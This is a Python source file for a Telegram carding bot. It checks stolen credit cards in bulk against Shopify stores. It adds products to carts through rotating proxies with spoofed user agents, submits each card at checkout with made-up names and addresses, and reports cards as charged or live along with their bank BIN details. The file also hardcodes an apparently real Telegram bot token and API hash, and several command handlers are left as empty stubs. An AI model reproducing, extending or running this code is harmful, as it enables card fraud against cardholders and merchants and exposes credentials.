from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import httpx
from datetime import datetime
from urllib.parse import quote
from fake_useragent import UserAgent

# ==================== دوال الفحص من app.py ====================

def parse_proxy_ultimate(proxy_str: str):
    """تحليل البروكسي بأي صيغة"""
    if not proxy_str:
        return None
    
    proxy_str = proxy_str.strip()
    proxy_type = 'http'
    
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy_str, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy_str = protocol_match.group(2)
    
    host = ''
    port = ''
    username = ''
    password = ''
    
    match = re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy_str)
    if match:
        username, password, host, port = match.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy_str):
        host, port, username, password = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy_str).groups()
    elif re.match(r'^([^:@]+):(\d+)$', proxy_str):
        host, port = re.match(r'^([^:@]+):(\d+)$', proxy_str).groups()
    else:
        return None
    
    if not host or not port:
        return None
    
    if username and password:
        user_encoded = quote(username, safe='')
        pass_encoded = quote(password, safe='')
        return f'http://{user_encoded}:{pass_encoded}@{host}:{port}'
    else:
        return f'http://{host}:{port}'

class ShopifyCheckerDirect:
    """نفس آلية فحص Shopify من app.py"""
    
    def __init__(self, proxy: str = None):
        self.ua = UserAgent()
        self.proxy = proxy
    
    async def get_cheapest_product(self, session: httpx.AsyncClient, site: str):
        """جلب أرخص منتج"""
        urls_to_try = [f"{site}/products.json", f"{site}/collections/all/products.json"]
        
        for base_url in urls_to_try:
            page = 1
            while page <= 10:
                url = f"{base_url}?page={page}&limit=250"
                try:
                    response = await session.get(url)
                    if response.status_code != 200:
                        break
                    
                    data = response.json()
                    products = data.get('products', [])
                    if not products:
                        break
                    
                    for product in products:
                        for variant in product.get('variants', []):
                            if variant.get('available', False):
                                try:
                                    price = float(variant.get('price', 100))
                                    return {
                                        'id': str(variant['id']),
                                        'title': product.get('title', 'Product'),
                                        'price': str(int(price * 100)),
                                        'price_value': price
                                    }
                                except:
                                    pass
                    
                    if len(products) < 250:
                        break
                    page += 1
                except:
                    page += 1
        return None
    
    async def extract_checkout_tokens(self, html: str):
        """استخراج التوكنات من صفحة الدفع"""
        tokens = {}
        
        session_patterns = [
            r'session-token" content="([^"]+)"',
            r'"sessionToken":"([^"]+)"',
        ]
        for pattern in session_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                tokens['session_token'] = match.group(1)
                break
        if 'session_token' not in tokens:
            tokens['session_token'] = ""
        
        queue_patterns = [r'"queueToken":"([^"]+)"', r'data-queue-token="([^"]+)"']
        for pattern in queue_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                tokens['queue_token'] = match.group(1)
                break
        if 'queue_token' not in tokens:
            tokens['queue_token'] = ""
        
        stable_patterns = [r'stableId["\']?\s*:\s*["\']([^"\']+)["\']']
        for pattern in stable_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                tokens['stable_id'] = match.group(1)
                break
        if 'stable_id' not in tokens:
            tokens['stable_id'] = ""
        
        payment_patterns = [r'paymentMethodIdentifier["\']?\s*:\s*["\']([^"\']+)["\']']
        for pattern in payment_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                tokens['payment_id'] = match.group(1)
                break
        if 'payment_id' not in tokens:
            tokens['payment_id'] = ""
        
        total_patterns = [r'"totalPrice"\s*:\s*{\s*"amount"\s*:\s*"(\d+)"']
        for pattern in total_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                tokens['updated_total'] = match.group(1)
                break
        if 'updated_total' not in tokens:
            tokens['updated_total'] = ""
        
        return tokens
    
    async def get_random_info(self):
        """معلومات عشوائية"""
        first = random.choice(["John", "Emily", "Michael", "Jessica", "David", "Sarah"])
        last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones"])
        addresses = ["123 Main St", "456 Oak Ave", "789 Pine Rd"]
        cities = ["Portland", "Bangor", "Lewiston"]
        
        return {
            "first": first,
            "last": last,
            "email": f"{first.lower()}.{last.lower()}{random.randint(1,999)}@gmail.com",
            "phone": random.choice(["2025550199", "3105551234", "4155559876"]),
            "address": random.choice(addresses),
            "city": random.choice(cities),
            "state": "ME",
            "zip": random.choice(["04101", "04102", "04401"])
        }
    
    async def process_card(self, site: str, card: str):
        """الفحص الأساسي - نفس اللي في app.py"""
        try:
            parts = card.split('|')
            if len(parts) != 4:
                return {"status": "error", "message": "Invalid card format", "price": None}
            
            cc_num, month, year, cvv = parts
            if len(year) == 4:
                year = year[2:]
            
            client_kwargs = {
                'timeout': 45.0,
                'follow_redirects': True,
                'verify': False,
                'headers': {'User-Agent': self.ua.random}
            }
            if self.proxy:
                parsed = parse_proxy_ultimate(self.proxy)
                if parsed:
                    client_kwargs['proxy'] = parsed
            
            async with httpx.AsyncClient(**client_kwargs) as session:
                # جلب المنتج
                product = await self.get_cheapest_product(session, site)
                if not product:
                    return {"status": "declined", "message": "No products found", "price": None}
                
                # إضافة للسلة
                resp = await session.post(
                    f"{site}/cart/add.js",
                    data={'id': product['id'], 'quantity': 1}
                )
                if resp.status_code not in [200, 201, 302]:
                    return {"status": "error", "message": "Failed to add to cart", "price": product['price']}
                
                # جلب التوكين
                resp = await session.get(f"{site}/cart.js")
                if resp.status_code != 200:
                    return {"status": "error", "message": "Failed to get cart", "price": product['price']}
                
                cart = resp.json()
                cart_token = cart.get('token')
                
                # الدخول للدفع
                resp = await session.get(f"{site}/checkout")
                if resp.status_code != 200:
                    return {"status": "error", "message": "Failed to access checkout", "price": product['price']}
                
                tokens = await self.extract_checkout_tokens(resp.text)
                
                if not tokens.get('session_token'):
                    return {"status": "error", "message": "No session token", "price": product['price']}
                
                user = await self.get_random_info()
                
                # إنشاء جلسة دفع
                payment_data = {
                    'credit_card': {
                        'number': cc_num,
                        'month': month,
                        'year': year,
                        'verification_value': cvv,
                        'name': f"{user['first']} {user['last']}"
                    }
                }
                
                resp = await session.post(
                    'https://deposit.us.shopifycs.com/sessions',
                    json=payment_data,
                    headers={'Content-Type': 'application/json'}
                )
                
                if resp.status_code != 200:
                    return {"status": "declined", "message": "Payment session failed", "price": product['price']}
                
                payment_session = resp.json()
                session_id = payment_session.get('id')
                
                if not session_id:
                    error = payment_session.get('error', {}).get('message', '')
                    if 'declined' in error.lower():
                        return {"status": "declined", "message": f"Declined - {error}", "price": product['price']}
                    return {"status": "declined", "message": "Card declined", "price": product['price']}
                
                graphql_url = f"{site}/checkouts/unstable/graphql"
                graphql_payload = {
                    'operationName': 'SubmitForCompletion',
                    'query': '''
                        mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!) {
                            submitForCompletion(input: $input, attemptToken: $attemptToken) {
                                __typename
                                ... on SubmitSuccess {
                                    receipt { id token }
                                }
                                ... on SubmitFailed { reason }
                            }
                        }
                    ''',
                    'variables': {
                        'input': {
                            'sessionInput': {'sessionToken': tokens['session_token']},
                            'queueToken': tokens.get('queue_token'),
                            'delivery': {
                                'deliveryLines': [{
                                    'targetMerchandiseLines': {
                                        'lines': [{'stableId': tokens.get('stable_id')}]
                                    },
                                    'destination': {
                                        'streetAddress': {
                                            'address1': user['address'],
                                            'city': user['city'],
                                            'countryCode': 'US',
                                            'postalCode': user['zip'],
                                            'firstName': user['first'],
                                            'lastName': user['last'],
                                            'phone': user['phone']
                                        }
                                    }
                                }]
                            },
                            'payment': {
                                'paymentLines': [{
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': tokens.get('payment_id'),
                                            'sessionId': session_id,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': user['address'],
                                                    'city': user['city'],
                                                    'countryCode': 'US',
                                                    'postalCode': user['zip'],
                                                    'firstName': user['first'],
                                                    'lastName': user['last'],
                                                    'phone': user['phone']
                                                }
                                            }
                                        }
                                    }
                                }]
                            },
                            'buyerIdentity': {
                                'buyerIdentity': {
                                    'presentmentCurrency': 'USD',
                                    'countryCode': 'US'
                                },
                                'contactInfoV2': {
                                    'emailOrSms': {'value': user['email']}
                                }
                            }
                        },
                        'attemptToken': f"{cart_token}-{random.random()}"
                    }
                }
                
                headers = {
                    'User-Agent': self.ua.random,
                    'X-Checkout-One-Session-Token': tokens['session_token'],
                    'Content-Type': 'application/json'
                }
                
                resp = await session.post(graphql_url, json=graphql_payload, headers=headers)
                
                if resp.status_code != 200:
                    return {"status": "error", "message": "GraphQL failed", "price": product['price']}
                
                result = resp.json()
                
                if 'data' in result and result['data'].get('submitForCompletion'):
                    completion = result['data']['submitForCompletion']
                    
                    if completion.get('__typename') == 'SubmitSuccess':
                        receipt = completion.get('receipt', {})
                        if receipt.get('id'):
                            return {"status": "charged", "message": "CHARGED! Order confirmed", "price": product['price']}
                        return {"status": "charged", "message": "CHARGED!", "price": product['price']}
                    
                    elif completion.get('__typename') == 'SubmitFailed':
                        reason = completion.get('reason', '')
                        if 'insufficient' in reason.lower():
                            return {"status": "approved", "message": "APPROVED - Insufficient funds", "price": product['price']}
                        elif 'cvv' in reason.lower():
                            return {"status": "approved", "message": "APPROVED - Invalid CVV", "price": product['price']}
                        elif 'declined' in reason.lower():
                            return {"status": "declined", "message": "DECLINED", "price": product['price']}
                
                return {"status": "unknown", "message": "Unknown response", "price": product['price']}
                
        except Exception as e:
            return {"status": "error", "message": str(e), "price": None}

# ==================== باقي كود البوت ====================

PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088",
    "🔥": "5999340396432333728",
    "❌": "6037570896766438989",
    "⚡": "6026367225466720832",
    "💳": "5971944878815317190",
    "💠": "5971837723676249096",
    "📝": "6023660820544623088",
    "🌐": "6026367225466720832",
    "🎯": "5974235702701853774",
    "🤖": "6057466460886799210",
    "🤵": "4949560993840629085",
    "💰": "5971944878815317190",
    "⏸️": "6001440193058444284",
    "▶️": "6285315214673975495",
    "🛑": "5420323339723881652",
    "📊": "5971837723676249096",
    "📦": "6066395745139824604",
    "📋": "5974235702701853774",
    "🔄": "5971837723676249096",
    "⏳": "5971837723676249096",
    "🚀": "6282977077427702833",
    "⚠️": "5420323339723881652",
    "💎": "6023660820544623088",
}

def premium_emoji(text):
    if not text:
        return text
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# Bot Configuration
API_ID = 28095409
API_HASH = '5883d21dcb98154b67960e96dc2a690e'
BOT_TOKEN = '8558756991:AAF6yyZ_MiNH-_H5cBGogx7vuLGVBUZODYQ'

PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'cloudflare', 
    'connection failed', 'timed out', 'access denied', 
    'ssl routines', 'could not resolve', 'domain name not found',
    'timeout', 'unreachable', 'ssl error', '502', '503', '504',
    'gateway timeout', 'network error', 'connection reset',
    'captcha required', 'site dead', 'failed', 'no products found'
)

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception:
        return []

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def is_premium(user_id):
    return True

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                data = await res.json()
                brand = data.get('brand', '-')
                bin_type = data.get('type', '-')
                level = data.get('level', '-')
                bank = data.get('bank', '-')
                country = data.get('country_name', '-')
                flag = data.get('country_flag', '')
                return brand, bin_type, level, bank, country, flag
    except:
        return '-', '-', '-', '-', '-', ''

async def check_card_direct(card, site, proxy):
    """الفحص المباشر باستخدام ShopifyCheckerDirect"""
    try:
        site_url = f'https://{site}'
        checker = ShopifyCheckerDirect(proxy=proxy)
        result = await checker.process_card(site_url, card)
        
        status_map = {
            'charged': 'Charged',
            'approved': 'Approved',
            'declined': 'Dead',
            'error': 'Site Error',
            'unknown': 'Dead'
        }
        
        # تحقق من أخطاء الموقع
        if is_dead_site_error(result.get('message', '')):
            return {
                'status': 'Site Error',
                'message': result.get('message', 'Site error'),
                'card': card,
                'retry': True,
                'gateway': 'Shopify',
                'price': result.get('price', '-')
            }
        
        return {
            'status': status_map.get(result['status'], 'Dead'),
            'message': result.get('message', 'Unknown'),
            'card': card,
            'site': site,
            'gateway': 'Shopify',
            'price': result.get('price', '-'),
            'retry': result['status'] == 'error'
        }
        
    except Exception as e:
        return {
            'status': 'Site Error' if 'timeout' in str(e).lower() else 'Dead',
            'message': str(e),
            'card': card,
            'gateway': 'Unknown',
            'price': '-',
            'retry': 'timeout' in str(e).lower()
        }

async def check_card_with_retry(card, sites, proxies, max_retries=3):
    """فحص بطاقة مع إعادة المحاولة"""
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card_direct(card, site, proxy)

        if not result.get('retry'):
            return result

        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.5)

    if last_result:
        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

# ==================== باقي دوال البوت (نفسها ما تغيرت) ====================

async def send_realtime_hit(user_id, result, hit_type, username):
    emoji = "✅" if hit_type == "Charged" else "🔥"
    status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if hit_type == "Charged" else "𝐋𝐢𝐯𝐞"
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    
    message = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>
<blockquote>{emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot By: <a href="tg://user?id={user_id}">Mustafa 🔥</a></b>"""
    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except:
        pass

async def update_progress(user_id, message_id, results, current_attempt_count):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Shopify')
    progress_text = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>📊 Checked: {current_attempt_count}/{results['total']}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>"""
    buttons = [[Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")], [Button.inline("🛑 Stop", b"stop")]]
    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except:
        pass

async def send_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f"✅ <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f"🔥 <code>{r['card']}</code>\n"
    if not hits_text:
        hits_text = "No hits found"
    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Shopify')
    summary = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot By: <a href="tg://user?id={user_id}">Mustafa 🔥</a></b>"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"Mustafa_{user_id}_{timestamp}.txt"
    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n")
        await f.write("⚡💳 CC CHECKER RESULTS 💳⚡\n")
        await f.write("=" * 70 + "\n\n")
        await f.write(f"✅ CHARGED ({len(results['charged'])}):\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Shopify')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write(f"\n🔥 APPROVED ({len(results['approved'])}):\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Shopify')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write(f"\n❌ DEAD ({len(results['dead'])}):\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Shopify')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')
    try:
        os.remove(filename)
    except:
        pass

# ==================== الأوامر ====================

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.reply(
        premium_emoji(
            "<b>⚡💳 Welcome to Mustafa Checker! 💳⚡</b>\n"
            "<b>━━━━━━━━━━━━━━━━━</b>\n"
            "<b>✅ Bot now uses DIRECT Shopify API!</b>\n"
            "<b>━━━━━━━━━━━━━━━━━</b>\n"
            "<b>⚡💠 𝐂𝐂 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /cc card|mm|yy|cvv - Check single CC\n"
            "• /chk - Reply to .txt file to check cards</blockquote>\n"
            "<b>⚡💠 𝐒𝐢𝐭𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /site - Check all sites & remove dead\n"
            "• /rm url - Remove a specific site</blockquote>\n"
            "<b>⚡💠 𝐏𝐫𝐨𝐱𝐲 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /proxy - Check all proxies & remove dead\n"
            "• /addproxy - Add proxies (one per line)\n"
            "• /chkproxy proxy - Check single proxy\n"
            "• /rmproxy proxy - Remove single proxy\n"
            "• /rmproxyindex 1,2,3 - Remove by index\n"
            "• /clearproxy - Remove all proxies\n"
            "• /getproxy - Get all proxies</blockquote>\n"
            "<b>━━━━━━━━━━━━━━━━━</b>\n"
            "<b>✅ DIRECT SHOPIFY CHECKER - No External API Needed!</b>"
        ),
        parse_mode='html'
    )

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    
    if not is_premium(user_id):
        await event.reply("❌ Access Denied")
        return
    sites = load_sites()
    proxies = load_proxies()
    if not sites or not proxies:
        await event.reply("❌ No sites or proxies available.")
        return
    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply("❌ Invalid CC format. Use: /cc card|mm|yy|cvv")
        return
    card = cards[0]
    status_msg = await event.reply(f"🔄 Checking: {card}")
    result = await check_card_with_retry(card, sites, proxies, max_retries=3)
    brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
    
    if result['status'] == 'Charged':
        status_emoji, status_text = "✅", "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
    elif result['status'] == 'Approved':
        status_emoji, status_text = "🔥", "𝐋𝐢𝐯𝐞"
    else:
        status_emoji, status_text = "❌", "𝐃𝐞𝐚𝐝"
    
    final_resp = f"""<b>⚡💳 CC CHECKER</b>
━━━━━━━━━━━━━━━━━
{status_emoji} Status: {status_text}
💳 Card: <code>{result['card']}</code>
📝 Response: {result['message'][:150]}
🌐 Gateway: {result.get('gateway', 'Shopify')} | 💰 {result.get('price', '-')}
━━━━━━━━━━━━━━━━━
🎯 BIN Info:
{brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}
━━━━━━━━━━━━━━━━━
🤖 Bot By: Mustafa 🔥"""
    await status_msg.edit(premium_emoji(final_resp), parse_mode='html')

@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    
    if not is_premium(user_id):
        await event.reply("❌ Access Denied")
        return
    if not event.reply_to_msg_id:
        await event.reply("Please reply to a .txt file")
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply("Please reply to a .txt file")
        return
    if not load_sites() or not load_proxies():
        await event.reply("❌ No sites or proxies available.")
        return
    status_msg = await event.reply("🔄 Processing your file...")
    file_path = await reply_msg.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    cards = extract_cc(content)
    if not cards:
        await status_msg.edit("❌ No valid cards found in file.")
        os.remove(file_path)
        return
    if len(cards) > 5000:
        await status_msg.edit(f"⚠️ File contains {len(cards)} cards. Limiting to first 5000 cards.")
        cards = cards[:5000]
    os.remove(file_path)
    total_cards = len(cards)
    await status_msg.edit(f"🚀 Starting check for {total_cards} cards...")
    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}
    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': total_cards,
        'checked': 0,
        'start_time': time.time()
    }
    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
        last_update_time = [time.time()]
        
        async def worker():
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(1)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                current_sites = load_sites()
                current_proxies = load_proxies()
                if not current_sites or not current_proxies:
                    break
                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=2)
                all_results['checked'] += 1
                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    await send_realtime_hit(user_id, res, 'Charged', username)
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    await send_realtime_hit(user_id, res, 'Approved', username)
                else:
                    all_results['dead'].append(res)
                queue.task_done()
                now = time.time()
                if now - last_update_time[0] >= 1.0:
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                        except:
                            pass
        
        workers = [asyncio.create_task(worker()) for _ in range(8)]
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
    except Exception as e:
        await bot.send_message(user_id, f"❌ Error: {e}")
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        try:
            await status_msg.delete()
        except:
            pass
        await send_final_results(user_id, all_results)

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply("❌ Access Denied")
        return
    proxies = load_proxies()
    if not proxies:
        await event.reply("❌ proxy.txt is empty.")
        return
    status_msg = await event.reply(f"🔥 Checking {len(proxies)} proxies...")
    alive_proxies = []
    dead_proxies = []
    for i, proxy in enumerate(proxies):
        # اختبار بسيط للبروكسي
        parsed = parse_proxy_ultimate(proxy)
        if parsed:
            alive_proxies.append(proxy)
        else:
            dead_proxies.append(proxy)
        if (i + 1) % 5 == 0 or i + 1 == len(proxies):
            await status_msg.edit(f"📊 Progress: {i+1}/{len(proxies)}\n✅ Alive: {len(alive_proxies)}\n❌ Dead: {len(dead_proxies)}")
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in alive_proxies:
            await f.write(f"{proxy}\n")
    await status_msg.edit(f"✅ Done!\n✅ Alive: {len(alive_proxies)}\n❌ Removed: {len(dead_proxies)}")

# الأوامر المتبقية نفسها...
@bot.on(events.NewMessage(pattern='/site'))
async def site_command(event):
    # نفس الكود القديم
    pass

@bot.on(events.NewMessage(pattern='/rm'))
async def remove_site_command(event):
    # نفس الكود القديم
    pass

@bot.on(events.NewMessage(pattern='/addproxy'))
async def add_proxy_command(event):
    # نفس الكود القديم
    pass

@bot.on(events.NewMessage(pattern='/chkproxy\s+'))
async def check_single_proxy(event):
    # نفس الكود القديم
    pass

@bot.on(events.NewMessage(pattern='/rmproxy\s+'))
async def remove_single_proxy(event):
    # نفس الكود القديم
    pass

@bot.on(events.NewMessage(pattern='/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    # نفس الكود القديم
    pass

@bot.on(events.NewMessage(pattern='/clearproxy$'))
async def clear_all_proxies(event):
    # نفس الكود القديم
    pass

@bot.on(events.NewMessage(pattern='/getproxy$'))
async def get_all_proxies(event):
    # نفس الكود القديم
    pass

@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer("⏸️ Paused")

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer("▶️ Resumed")

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer("🛑 Stopped")
        await event.edit("⛔ Checking stopped by user.")

print("=" * 50)
print("✅ Bot started successfully!")
print("👤 Owner: Mustafa")
print("🎯 Status: DIRECT SHOPIFY CHECKER - No external API needed!")
print("=" * 50)
bot.run_until_disconnected()